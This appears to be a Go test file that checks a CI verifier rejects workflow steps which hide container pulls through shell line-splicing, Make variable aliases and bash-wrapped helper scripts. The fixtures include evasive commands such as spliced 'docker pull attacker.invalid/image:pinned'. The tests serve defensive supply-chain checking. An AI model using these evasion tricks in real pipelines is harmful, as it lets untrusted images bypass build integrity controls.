package releaseverify

import (
	"path/filepath"
	"strconv"
	"testing"
)

func TestVerifyCIContainerDownloadsRejectsShellLineSplicedRoutes(t *testing.T) {
	commands := map[string]string{
		"split Docker":        "do\\\ncker pull attacker.invalid/image:pinned",
		"quoted split Docker": "\"do\\\ncker\" pull attacker.invalid/image:pinned",
		"split helper":        "./scripts/ensure-contai\\\nner-image.sh attacker.invalid/image:pinned",
		"split Make":          "ma\\\nke test-pg",
		"CRLF split Docker":   "do\\\r\ncker pull attacker.invalid/image:pinned",
	}
	for name, command := range commands {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			workflow := "name: extra\non: push\njobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + strconv.Quote(command) + "\n"
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a shell line-spliced container route")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsMakeRecipeExecutableAliases(t *testing.T) {
	tests := map[string]struct {
		makeSource string
		workflow   string
	}{
		"parenthesized runner from environment": {
			makeSource: "acquire-runner:\n\t$(RUNNER) e2e\nacquire-alias: acquire-runner\n",
			workflow: `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    env:
      RUNNER: ./scripts/run-playwright-container.sh
    steps:
      - run: make acquire-alias
`,
		},
		"braced helper from environment": {
			makeSource: "acquire-helper:\n\t${HELPER} attacker.invalid/image:pinned\nacquire-alias: acquire-helper\n",
			workflow: `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    env:
      HELPER: ./scripts/ensure-container-image.sh
    steps:
      - run: make acquire-alias
`,
		},
		"command-line runner": {
			makeSource: "acquire-runner:\n\t$(RUNNER) e2e\n",
			workflow: `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: make acquire-runner RUNNER=./scripts/run-playwright-container.sh
`,
		},
	}
	for name, test := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			frontendPath := filepath.Join(root, "mk", "frontend.mk")
			writeFixtureFile(t, frontendPath, readFixtureFile(t, frontendPath)+"\n"+test.makeSource)
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), test.workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted an unresolved Make recipe executable alias")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsAlternateProtectedWorkflowInvocations(t *testing.T) {
	commands := map[string]string{
		"absolute Make":              `/usr/bin/make dev`,
		"quoted absolute Make":       `"/usr/bin/make" dev`,
		"variable Make executable":   `MAKE_BIN=/usr/bin/make; "$MAKE_BIN" dev`,
		"unresolved Make executable": `"$MAKE_BIN" dev`,
		"bash Playwright runner":     `bash scripts/run-playwright-container.sh visual`,
		"quoted Playwright runner":   `bash "scripts/run-playwright-container.sh" visual`,
		"variable Playwright runner": `RUNNER=scripts/run-playwright-container.sh; bash "$RUNNER" visual`,
		"bash image helper":          `bash scripts/ensure-container-image.sh attacker.invalid/image:pinned`,
		"quoted image helper":        `bash "scripts/ensure-container-image.sh" attacker.invalid/image:pinned`,
		"variable image helper":      `HELPER=scripts/ensure-container-image.sh; bash "$HELPER" attacker.invalid/image:pinned`,
	}
	for name, command := range commands {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			buildPath := filepath.Join(root, "mk", "build.mk")
			writeFixtureFile(t, buildPath, ".PHONY: dev\ndev:\n\tdocker compose up app\n")
			makefilePath := filepath.Join(root, "Makefile")
			writeFixtureFile(t, makefilePath, readFixtureFile(t, makefilePath)+"include mk/build.mk\n")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: `+command+"\n")
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted an alternate protected workflow invocation")
			}
		})
	}
}
